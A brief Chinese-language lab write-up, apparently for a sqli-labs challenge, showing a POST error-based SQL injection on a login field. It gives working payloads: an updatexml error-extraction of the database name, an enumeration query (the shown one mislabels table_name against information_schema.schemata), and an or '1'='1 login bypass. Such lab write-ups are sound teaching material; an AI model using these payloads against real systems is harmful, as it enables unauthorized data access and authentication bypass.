根据题目提示：post error injectin single(单引号）

输入admin'

有报错提示。

payload:

admin'and+updatexml(1,concat(0x7e,database(),0x7e),1)--+

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/1B3FA4DDCFD044CD8909017AD6561290clipboard.png)



接下来就是常规暴库语句：

select table_name from information_schema.schemata limit 0,1

但是updatexml只能爆出32个字节



这个题还可以试试万能密码：

payload:admin'or'1'='1



报错注入连接：

https://v0w.top/2018/08/03/MySQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/#updatexml